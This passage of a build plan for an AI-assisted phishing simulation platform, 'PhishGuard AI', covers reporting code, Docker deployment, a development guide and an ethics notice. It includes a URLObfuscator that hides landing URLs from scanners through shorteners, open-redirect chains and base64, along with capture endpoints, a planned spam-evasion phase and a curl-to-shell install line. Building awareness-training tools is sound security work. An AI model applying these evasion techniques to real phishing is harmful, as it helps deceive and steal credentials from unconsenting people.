        result = await self.ai.client.post("http://localhost:11434/api/generate", json={
            "model": "deepseek-v4-flash",
            "prompt": prompt,
            "stream": False,
            "options": {"temperature": 0.7, "max_tokens": 1024},
        })
        return result.json()["response"]
```

### 4.3 Advanced Reporting Engine

```python
# server/services/report_generator.py
class ReportGenerator:
    """Generate rich reports in multiple formats"""

    async def generate_pdf(self, campaign_id: str) -> bytes:
        """Generate PDF report using WeasyPrint (free)"""
        from weasyprint import HTML
        html = await self._render_report_html(campaign_id)
        return HTML(string=html).write_pdf()

    async def generate_excel(self, campaign_id: str) -> bytes:
        """Generate Excel report using OpenPyXL (free)"""
        from openpyxl import Workbook
        wb = Workbook()
        ws = wb.active
        ws.title = "Campaign Results"

        events = db.query(Event).filter(Event.campaign_id == campaign_id).all()
        ws.append(["Target", "Event Type", "Timestamp", "IP", "User Agent"])
        for e in events:
            target = db.query(Target).get(e.target_id)
            ws.append([target.email, e.event_type, e.timestamp,
                       e.ip_address, e.user_agent])

        # Summary sheet
        ws2 = wb.create_sheet("Summary")
        stats = self._get_stats(campaign_id)
        ws2.append(["Metric", "Value"])
        for k, v in stats.items():
            ws2.append([k, v])

        buf = BytesIO()
        wb.save(buf)
        return buf.getvalue()

    async def generate_html_dashboard(self, campaign_id: str) -> str:
        """Generate a standalone HTML report for sharing"""
        stats = self._get_stats(campaign_id)
        events = db.query(Event).filter(Event.campaign_id == campaign_id).all()

        # Build time-series chart data
        from collections import Counter
        from datetime import datetime
        hourly_opens = Counter()
        for e in events:
            if e.event_type == "opened":
                hour_key = e.timestamp.strftime("%Y-%m-%d %H:00")
                hourly_opens[hour_key] += 1

        return f"""
        <!DOCTYPE html>
        <html>
        <head><title>Campaign Report</title>
        <script src="https://cdn.jsdelivr.net/npm/chart.js"></script></head>
        <body>
        <h1>Campaign: {stats['name']}</h1>
        <div class="stats-grid">
            <div class="stat">Sent: {stats['sent']}</div>
            <div class="stat">Opened: {stats['opened']}</div>
            <div class="stat">Clicked: {stats['clicked']}</div>
            <div class="stat">Submitted: {stats['submitted']}</div>
        </div>
        <canvas id="chart"></canvas>
        <script>
        new Chart(document.getElementById('chart'), {{
            type: 'line',
            data: {{
                labels: {list(hourly_opens.keys())},
                datasets: [{{
                    label: 'Opens',
                    data: {list(hourly_opens.values())}
                }}]
            }}
        }});
        </script>
        <table>
            <tr><th>Target</th><th>Opened</th><th>Clicked</th><th>Submitted</th></tr>
            {self._target_rows(campaign_id)}
        </table>
        </body>
        </html>
        """

    def _get_stats(self, campaign_id: str) -> dict:
        campaign = db.query(Campaign).get(campaign_id)
        events = db.query(Event).filter(Event.campaign_id == campaign_id).all()
        return {
            "name": campaign.name,
            "sent": sum(1 for e in events if e.event_type == "sent"),
            "opened": sum(1 for e in events if e.event_type == "opened"),
            "clicked": sum(1 for e in events if e.event_type == "clicked"),
            "submitted": sum(1 for e in events if e.event_type == "submitted"),
            "bounced": sum(1 for e in events if e.event_type == "bounced"),
            "open_rate": 0,
            "click_rate": 0,
            "submit_rate": 0,
        }
```

### 4.4 Phishing URL Detection Evasion

```python
# server/services/url_obfuscation.py
import hashlib, base64
from urllib.parse import urlparse, urlunparse

class URLObfuscator:
    """Obfuscate tracking/landing URLs to evade URL scanners"""

    @staticmethod
    def shorten_with_tinyurl(long_url: str) -> str:
        """Use TinyURL's free API for URL shortening"""
        import httpx
        resp = httpx.post("https://tinyurl.com/api-create.php",
                          data={"url": long_url})
        return resp.text.strip()

    @staticmethod
    def create_redirect_chain(final_url: str, hops: int = 3) -> list[str]:
        """Create a chain of redirect URLs to obscure the final destination"""
        import secrets
        chains = []
        for i in range(hops):
            # Use free redirect services
            services = [
                f"https://www.google.com/url?q={final_url}",
                f"https://l.facebook.com/l.php?u={final_url}",
                f"https://out.reddit.com/t3_1?url={final_url}",
            ]
            chains.append(secrets.choice(services))
        return chains

    @staticmethod
    def base64_encode_url(url: str) -> str:
        """Base64 encode the URL parameter"""
        encoded = base64.urlsafe_b64encode(url.encode()).decode()
        return f"https://phishguard.local/r/{encoded}"
```

### 4.5 Multi-User & RBAC

```python
# server/models/user.py
class User(Base):
    __tablename__ = "users"
    id       = Column(UUID, primary_key=True, default=uuid4)
    email    = Column(String(255), unique=True, nullable=False)
    password = Column(String(255), nullable=False)  # bcrypt hash
    role     = Column(Enum("admin", "operator", "viewer"), default="operator")
    api_key  = Column(String(64), unique=True)

# Simple JWT auth
def create_access_token(user_id: str, role: str) -> str:
    payload = {"sub": user_id, "role": role, "exp": datetime.utcnow() + timedelta(hours=24)}
    return jwt.encode(payload, settings.JWT_SECRET, algorithm="HS256")
```

### 4.6 Docker Production Deployment

```yaml
# docker-compose.yml
version: "3.9"
services:
  postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: phishguard
      POSTGRES_USER: phishguard
      POSTGRES_PASSWORD: ${DB_PASSWORD}
    volumes:
      - pgdata:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U phishguard"]

  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]

  ollama:
    image: ollama/ollama:latest
    volumes:
      - ollama_data:/root/.ollama
    ports:
      - "11434:11434"
    deploy:
      resources:
        reservations:
          devices:
            - driver: nvidia
              count: all
              capabilities: [gpu]

  api:
    build:
      context: .
      dockerfile: docker/Dockerfile.api
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
    environment:
      DATABASE_URL: postgresql+asyncpg://phishguard:${DB_PASSWORD}@postgres/phishguard
      REDIS_URL: redis://redis:6379
      OLLAMA_URL: http://ollama:11434
      JWT_SECRET: ${JWT_SECRET}
    ports:
      - "8000:8000"

  worker:
    build:
      context: .
      dockerfile: docker/Dockerfile.worker
    depends_on: [postgres, redis, ollama]
    environment:
      DATABASE_URL: postgresql+asyncpg://phishguard:${DB_PASSWORD}@postgres/phishguard
      REDIS_URL: redis://redis:6379
      OLLAMA_URL: http://ollama:11434

  frontend:
    build:
      context: frontend
      dockerfile: Dockerfile
    ports:
      - "3000:80"
    depends_on: [api]

  caddy:
    image: caddy:2-alpine
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./docker/Caddyfile:/etc/caddy/Caddyfile
      - caddy_data:/data
    depends_on: [api, frontend]

volumes:
  pgdata:
  ollama_data:
  caddy_data:
```

```caddyfile
# docker/Caddyfile
phishguard.example.com {
    reverse_proxy /api/* api:8000
    reverse_proxy /ws/* api:8000
    reverse_proxy /track/* api:8000
    reverse_proxy /capture/* api:8000
    reverse_proxy /landing/* api:8000
    reverse_proxy frontend:80
}
```

---

## Development Guide Using Free AI Tools

### Step 1: Initial Setup with AI Assistance

```bash
# Use opencode or Claude Code to scaffold the project
# Prompt: "Create a Python FastAPI project structure with SQLAlchemy models for a phishing simulation campaign manager"

mkdir phishguard && cd phishguard
python -m venv venv
source venv/bin/activate
pip install fastapi uvicorn sqlalchemy alembic aiosmtplib click rich

# Generate the initial database schema using an LLM
opencode "Generate SQLAlchemy models for Campaign, Target, Template, Event, SendingProfile with all necessary fields"
```

### Step 2: Generate Tracking Server with AI

```bash
# Prompt an LLM to write the tracking pixel endpoint
opencode "Create a FastAPI route that serves a 1x1 transparent GIF for tracking email opens. Include HMAC-based token validation and async event logging to database"
```

### Step 3: AI Content Generator Integration

```bash
# Install and configure Ollama
curl -fsSL https://ollama.com/install.sh | sh
ollama pull deepseek-v4-flash

# Use AI to write the integration code
opencode "Write a Python class AIContentGenerator that uses httpx to call Ollama's /api/generate endpoint. Include JSON mode, error handling, and support for multiple models"
```

### Step 4: Frontend with shadcn/ui

```bash
# Use AI to scaffold React components
opencode "Create a React component for a campaign creation wizard with 4 steps: template selection, target import, sending profile, schedule. Use shadcn/ui components like Stepper, Card, Button, Input"
```

### Step 5: Testing with AI-Generated Tests

```bash
# Generate test fixtures
opencode "Write pytest tests for the CampaignManager service. Include mocking for SMTP, database session, and event tracking"
pytest tests/ --cov=server --cov-report=html
```

### Step 6: Documentation with AI

```bash
# Generate docs scaffolding
opencode "Create MkDocs documentation structure with pages for installation, configuration, CLI usage, API reference, and deployment"
```

### Free AI Tools Used Throughout Development

| Tool | Use Case | Cost |
|------|----------|------|
| Ollama + DeepSeek V4-Flash | Code generation, content generation | $0 (local) |
| opencode / Claude Code | AI pair programming | Free tier |
| Hugging Face Transformers | Spam classification model | $0 (free) |
| GitHub Copilot (Free) | In-IDE autocomplete | Free for OSS |
| Phind / Perplexity | Research & debugging | Free tier |
| MkDocs + Material | Documentation | $0 |
| GitHub Actions | CI/CD | Free for public repos |
| WeasyPrint | PDF report generation | $0 (open source) |
| Chart.js | Report visualizations | $0 (MIT) |
| TinyURL API | URL shortening for campaigns | Free tier |

---

## Resources & Links

### Official Documentation & Frameworks
- **GoPhish:** https://github.com/gophish/gophish — The most popular open-source phishing framework (Go)
- **Social-Engineer Toolkit (SET):** https://github.com/trustedsec/social-engineer-toolkit — Python-based social engineering framework
- **Evilginx2:** https://github.com/kgretzky/evilginx2 — AiTM phishing proxy framework
- **Phishing Club:** https://github.com/phishingclub/phishingclub — Full-stack phishing simulation platform
- **PhishIntel:** https://github.com/cloudsecnetwork/phishintel — AI-powered phishing simulation (Node.js)

### AI/LLM Tools (Free)
- **Ollama:** https://ollama.com — Local LLM runner (Docker-like UX)
- **DeepSeek V4-Flash:** https://ollama.com/library/deepseek-v4-flash — MIT-licensed, 1M context, free for commercial use
- **Llama 4 Scout:** https://ollama.com/library/llama4-scout — Meta's latest, 1M context
- **Mistral:** https://ollama.com/library/mistral-small — Fast, low-resource model
- **Hugging Face:** https://huggingface.co — Model hub, datasets (SpamAssassin corpus)
- **LangChain:** https://github.com/langchain-ai/langchain — LLM orchestration framework (Python/JS)
- **sentence-transformers:** https://github.com/UKPLab/sentence-transformers — Text embeddings for template similarity

### Email & Tracking Infrastructure
- **Postfix:** https://www.postfix.org — Free SMTP server for email sending
- **Mailpit:** https://github.com/axllent/mailpit — Free email testing tool (SMTP sink + web UI)
- **smtp4dev:** https://github.com/rnwood/smtp4dev — Fake SMTP server for development
- **SpamAssassin:** https://spamassassin.apache.org — Free spam filter for testing email deliverability
- **GeoLite2 (MaxMind):** https://dev.maxmind.com/geoip/geolite2-free-geolocation-data — Free IP geolocation database

### Frontend
- **shadcn/ui:** https://ui.shadcn.com — Free, accessible React component library
- **Tailwind CSS:** https://tailwindcss.com — Utility-first CSS framework
- **Recharts:** https://recharts.org — Composable charting library for React
- **TanStack Query:** https://tanstack.com/query — Server state management for React

### Deployment & Infrastructure
- **Docker:** https://docker.com — Containerization
- **Caddy:** https://caddyserver.com — Web server with automatic HTTPS (Let's Encrypt)
- **GitHub Actions:** https://github.com/features/actions — Free CI/CD for public repos
- **Oracle Cloud Free Tier:** https://www.oracle.com/cloud/free — Free ARM VPS (4 OCPU, 24GB RAM) for hosting
- **Fly.io Free Tier:** https://fly.io — Free 256MB RAM VM for lightweight hosting

### Security Awareness Training Content (Free)
- **SANS Security Awareness:** https://www.sans.org/security-awareness — Free posters, newsletters
- **CISA Phishing Resources:** https://www.cisa.gov/phishing — Government resources
- **Phishing.org:** https://www.phishing.org — Free educational materials
- **OWASP Phishing Guide:** https://owasp.org/www-project-php-security-guide

### Data Sets (Free)
- **SpamAssassin Public Corpus:** https://spamassassin.apache.org/old/publiccorpus — 6,000+ labelled emails
- **Enron Email Dataset:** https://www.cs.cmu.edu/~enron — 500k+ real corporate emails
- **Phishing URL Datasets:** https://phishtank.org — Community-contributed phishing URL database

### Research Papers
- Heiding et al. (2024): "How LLMs can be used for phishing" — https://arxiv.org/abs/2408.16168
- Hazell (2023): "LLMs for spear phishing" — https://arxiv.org/abs/2309.10463
- "Next-Generation Phishing: How LLM Agents Empower Cyber Attackers" — https://arxiv.org/abs/2411.13874

---

## Timeline Estimate

| Phase | Weeks | Effort (hours) | Milestone |
|-------|-------|----------------|-----------|
| **Phase 1: Core Framework** | 1-4 | 80-120 | CLI tool sends emails, tracks opens/clicks, basic reporting. Fully functional without AI. |
| **Phase 2: AI Content Gen** | 5-8 | 60-100 | Ollama integrated, AI generates emails and landing pages. Template variation engine works. |
| **Phase 3: Web UI** | 9-13 | 120-160 | Full React dashboard with campaign wizard, real-time tracking, AI generation UI. |
| **Phase 4: Advanced Features** | 14-18 | 80-120 | Spam evasion, ML detection, training generator, PDF/Excel reports, RBAC, Docker deploy. |
| **Testing & Polish** | 19-20 | 40-60 | Penetration test own tool, fix bugs, write docs, CI/CD pipeline. |
| **v1.0 Release** | 20 | — | First stable release. |

**Total estimated solo effort: 380-560 hours (~3-4 months full-time).**

### Parallelization Strategy

| Person | Focus |
|--------|-------|
| Backend engineer (P1) | Phase 1 core + Phase 2 AI integration |
| Frontend engineer (P1) | Phase 3 UI (can start parallel to Phase 2) |
| ML/Security engineer (P2) | Phase 4 evasion + training content |
| DevOps (P2) | Docker, CI/CD, deployment guides |

With 2 people: ~8-10 weeks to v1.0.
With 4 people: ~5-6 weeks to v1.0.

---

## Installation Quick-Start (Preview)

```bash
# Option 1: pip install
pip install phishguard
phishguard init
phishguard serve  # Starts API + tracking server

# Option 2: Docker
git clone https://github.com/phishguard-ai/phishguard.git
cd phishguard
cp .env.example .env  # Edit DB_PASSWORD, JWT_SECRET
docker compose up -d

# Option 3: From source
git clone https://github.com/phishguard-ai/phishguard.git
cd phishguard
python -m venv venv && source venv/bin/activate
pip install -e ".[dev]"
alembic upgrade head
phishguard serve

# Verify installation
phishguard status
# → PhishGuard AI v0.1.0
# → API running at http://localhost:8000
# → Ollama: connected (deepseek-v4-flash loaded)
# → Postgres: connected
# → Redis: connected
```

```bash
# Quick campaign (no UI needed)
phishguard campaign quick \
  --targets employees.csv \
  --scenario invoice \
  --company "Acme Corp" \
  --smtp smtp.example.com:587 \
  --from "billing@acme-corp.com"
```

---

## Ethics & Legal Notice

PhishGuard AI is designed exclusively for **authorized security awareness training** and **penetration testing with written permission**. It must NEVER be used against individuals or organizations without explicit, documented authorization. Unauthorized use may violate the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.

The tool includes:
- A mandatory consent acknowledgment on first launch
- Clear branding on all generated pages (configurable banner: "PHISHING SIMULATION — AUTHORIZED TEST")
- Automatic campaign expiration (max 7-day campaigns by default)
- Target list validation requiring domain ownership verification
- Data purging after campaign completion (GDPR-compliant)

---

*"The best way to build resilient humans is to train them with the same tools attackers use — but ethically, safely, and freely."*